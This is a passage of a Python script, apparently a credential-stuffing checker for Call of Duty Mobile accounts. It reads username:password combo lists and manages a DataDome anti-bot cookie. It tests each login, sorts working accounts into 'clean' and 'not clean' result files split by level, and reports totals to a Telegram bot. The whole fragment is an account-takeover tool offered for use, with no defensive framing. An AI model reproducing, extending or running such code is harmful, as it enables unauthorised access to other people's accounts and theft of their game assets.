        if datadome:
            datadome_manager.set_datadome(datadome)
            logger.info(f"[𝙄𝙉𝙁𝙊] Generated initial DataDome cookie")    
    
    # Load accounts
    accounts = []
    encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings_to_try:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                accounts = [line.strip() for line in file if line.strip()]
            logger.info(f"[SUCCESS] File loaded with {encoding} encoding")
            break
        except UnicodeDecodeError:
            logger.warning(f"[WARNING] Failed to read with {encoding} encoding, trying next...")
            continue
        except Exception as e:
            logger.error(f"[ERROR] Error reading file with {encoding}: {e}")
            continue
    
    if not accounts:
        try:
            logger.info(f"[INFO] Trying with error handling...")
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                accounts = [line.strip() for line in file if line.strip()]
            logger.info(f"[SUCCESS] File loaded with error handling")
        except Exception as e:
            logger.error(f"[ERROR] Could not read file with any encoding: {e}")
            return
    
    if not accounts:
        logger.error(f"[ERROR] No accounts found in file '{filename}'")
        return
    
    logger.info(f"[𝙄𝙉𝙁𝙊] Total accounts to process: {len(accounts)}")
    
    # Create LiveStatsDisplay with progress bar
    live_stats = LiveStatsDisplay(len(accounts))
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}      CHECKER STARTED")
    print(f"{Fore.CYAN}      File: {os.path.basename(filename)}")
    print(f"{Fore.CYAN}      Accounts: {len(accounts)}")
    print(f"{Fore.CYAN}{'='*60}{Fore.RESET}\n")
    
    # Track checked accounts for removal
    checked_accounts = set()
    accounts_to_remove = []
    
    try:
        # Start the live display
        with Live(live_stats.progress, console=console, refresh_per_second=10) as live_progress:
            for i, account_line in enumerate(accounts, 1):
                if ':' not in account_line:
                    logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
                    continue
                    
                try:
                    account, password = account_line.split(':', 1)
                    account = account.strip()
                    password = password.strip()
                    
                    # Add to checked accounts
                    checked_accounts.add(account)
                    
                    # Process account
                    is_valid, result = processaccount(session, account, password, cookie_manager, 
                                                    datadome_manager, live_stats, telegram_bot)
                    
                    # Color code the result
                    if "[SUCCESS]" in result:
                        print(f"{Fore.GREEN}{result}{Fore.RESET}")
                        # Add to removal list if valid (CODM found)
                        if is_valid:
                            accounts_to_remove.append(account)
                    elif "[ERROR]" in result:
                        print(f"{Fore.RED}{result}{Fore.RESET}")
                    elif "[WARNING]" in result:
                        print(f"{Fore.YELLOW}{result}{Fore.RESET}")
                    else:
                        print(result)
                    
                    # Show live stats box every 5 accounts
                    if i % 5 == 0 or i == len(accounts):
                        console.print(f"\n{live_stats.get_live_stats_box()}\n")
                    
                    # Update live progress
                    live_progress.update(live_stats.progress)
                    
                except Exception as e:
                    logger.error(f"[ERROR] Error processing account line {i}: {e}")
                    continue
        
    except KeyboardInterrupt:
        logger.info(f"\n[INFO] Checker stopped by user")
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error: {e}")
    finally:
        # Show final live stats
        console.print(f"\n{live_stats.get_live_stats_box()}\n")
        
        # Auto-remove checked accounts if enabled
        if auto_remove == 'y' and accounts_to_remove:
            removed = remove_checked_accounts(filename, accounts_to_remove)
            logger.info(f"[FILE] Auto-removed {removed} checked accounts")
        
        # Get final stats
        final_stats = live_stats.get_final_stats()
        
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}      FINAL STATISTICS")
        print(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
        print(f"{Fore.GREEN}📊 Total Accounts:{Fore.RESET} {final_stats['total']}")
        print(f"{Fore.GREEN}✅ Checked:{Fore.RESET} {final_stats['checked']}")
        print(f"{Fore.GREEN}🎯 Valid:{Fore.RESET} {final_stats['valid']}")
        print(f"{Fore.RED}❌ Invalid:{Fore.RESET} {final_stats['invalid']}")
        print(f"{Fore.GREEN}⚡ Has CODM:{Fore.RESET} {final_stats['has_codm']}")
        print(f"{Fore.YELLOW}⚠️ No CODM:{Fore.RESET} {final_stats['no_codm']}")
        print(f"{Fore.RED}🔗 Not Clean CODM:{Fore.RESET} {final_stats['not_clean_codm']}")
        print(f"{Fore.GREEN}✨ Clean CODM:{Fore.RESET} {final_stats['clean_codm']}")
        print(f"{Fore.CYAN}⏱️ Time Taken:{Fore.RESET} {final_stats['time_taken']}")
        print(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
        
        # Send final stats to Telegram
        if telegram_bot:
            telegram_bot.send_stats(
                final_stats['total'],
                final_stats['checked'],
                final_stats['has_codm'],
                final_stats['invalid'],
                final_stats['clean_codm'],
                final_stats['not_clean_codm'],
                final_stats['time_taken']
            )
        
        # Show file structure created
        print(f"\n{Fore.CYAN}📁 FILE STRUCTURE CREATED:{Fore.RESET}")
        print(f"{Fore.GREEN}├── Results/Full_details.txt{Fore.RESET}")
        print(f"{Fore.GREEN}├── Results/Clean_codm.txt{Fore.RESET}")
        print(f"{Fore.GREEN}├── Results/Notclean_codm.txt{Fore.RESET}")
        print(f"{Fore.GREEN}└── Results/Level_Separated/{Fore.RESET}")
        print(f"{Fore.CYAN}    ├── Level 1-100/")
        print(f"{Fore.CYAN}    ├── Level 101-200/")
        print(f"{Fore.CYAN}    ├── Level 201-300/")
        print(f"{Fore.CYAN}    └── Level 301-400/")
        print(f"\n{Fore.CYAN}⚙️ Config By: AxelLagingPogi(@MercyNot1){Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info(f"[INFO] Script terminated by user")
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error in main: {e}")
